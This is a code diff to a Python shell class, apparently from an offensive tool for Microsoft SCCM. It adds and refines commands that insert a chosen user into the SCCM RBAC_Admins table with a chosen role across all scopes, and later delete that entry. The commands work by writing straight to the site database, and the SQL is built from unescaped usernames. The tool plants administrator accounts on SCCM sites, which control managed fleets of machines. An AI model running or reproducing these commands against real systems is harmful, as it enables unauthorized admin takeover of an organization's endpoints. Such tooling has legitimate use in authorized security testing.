@@ -599,7 +599,7 @@ class SCCM_SQLSHELL(cmd.Cmd):
             logging.error(e)
     
     """
-    Add / remove admin users
+    sccm_add_admin [Username] [Role]     - Add a user to a SCCM admin role
     """
     def do_sccm_add_admin(self, arg=""):
         split_arg = arg.split()
@@ -613,6 +613,9 @@ class SCCM_SQLSHELL(cmd.Cmd):
 
         # Grab SID
         rows = self.__run_silent(f"SELECT SID0 FROM dbo.v_R_User WHERE Unique_User_Name0 = '{username}';")
+        if not rows:
+            logging.error("Unique username not found. Try domain\\username")
+            return
         sid = rows[0]['SID0']
         logging.debug(f"Grabbed SID of {username}: {sid}")
         hexsid = ldaptypes.LDAP_SID()
@@ -642,11 +645,30 @@ class SCCM_SQLSHELL(cmd.Cmd):
             "CMPivot Administrator" : "SMS000IR",
         }
 
-        # Add role
+        # Add role, specifying all scopes
         RoleID = perms[role]
         logging.debug(f"RoleID selected: {RoleID}")
-        query = f"DECLARE @AdminID INT; USE CM_{self._site_code}; INSERT INTO RBAC_Admins (AdminSID, LogonName, IsGroup, IsDeleted, CreatedBy, CreatedDate, ModifiedBy, ModifiedDate, SourceSite) SELECT {sid_enc}, '{username}', 0, 0, '', '', '', '', '{self._site_code}' WHERE NOT EXISTS ( SELECT 1 FROM RBAC_Admins WHERE LogonName = '{username}' ); SET @AdminID = (SELECT TOP 1 AdminID FROM RBAC_Admins WHERE LogonName = '{username}'); INSERT INTO RBAC_ExtendedPermissions (AdminID, RoleID, ScopeID, ScopeTypeID) SELECT @AdminID, RoleID, ScopeID, ScopeTypeID FROM (VALUES  ('{RoleID}', 'SMS00ALL', 29), ('{RoleID}', 'SMS00001', 1), ('{RoleID}', 'SMS00004', 1) ) AS V(RoleID, ScopeID, ScopeTypeID) WHERE NOT EXISTS ( SELECT 1 FROM RBAC_ExtendedPermissions  WHERE AdminID = @AdminID  AND RoleID = V.RoleID  AND ScopeID = V.ScopeID AND ScopeTypeID = V.ScopeTypeID );"
+        query = f"DECLARE @AdminID INT; INSERT INTO RBAC_Admins (AdminSID, LogonName, IsGroup, IsDeleted, CreatedBy, CreatedDate, ModifiedBy, ModifiedDate, SourceSite) SELECT {sid_enc}, '{username}', 0, 0, '', '', '', '', '{self._site_code}' WHERE NOT EXISTS ( SELECT 1 FROM RBAC_Admins WHERE LogonName = '{username}' ); SET @AdminID = (SELECT TOP 1 AdminID FROM RBAC_Admins WHERE LogonName = '{username}'); INSERT INTO RBAC_ExtendedPermissions (AdminID, RoleID, ScopeID, ScopeTypeID) SELECT @AdminID, RoleID, ScopeID, ScopeTypeID FROM (VALUES  ('{RoleID}', 'SMS00ALL', 29), ('{RoleID}', 'SMS00001', 1), ('{RoleID}', 'SMS00004', 1) ) AS V(RoleID, ScopeID, ScopeTypeID) WHERE NOT EXISTS ( SELECT 1 FROM RBAC_ExtendedPermissions  WHERE AdminID = @AdminID  AND RoleID = V.RoleID  AND ScopeID = V.ScopeID AND ScopeTypeID = V.ScopeTypeID );"
         self.__run(query)
+
+    """
+    sccm_remove_admin [Username]         - Remove a user from all SCCM admin roles
+    """
+    def do_sccm_remove_admin(self, arg=""):
+        split_arg = arg.split()
+        if len(split_arg) != 1:
+            logging.error("Did not get expected argument [Username]")
+            return
+        username = split_arg[0]
+
+        logging.debug(f"Removing admin {username}")
+
+        # Remove admin
+        # The following query deletes the latest created admin with the specified name (becomes non-unique with `sccm_impersonate_safe`)
+        query = f"DELETE FROM RBAC_Admins WHERE AdminID = (SELECT TOP 1 AdminID FROM RBAC_Admins WHERE LogonName = '{username}' ORDER BY AdminID DESC);"
+        self.__run(query)
+
+
 
 if __name__ == "__main__":
 
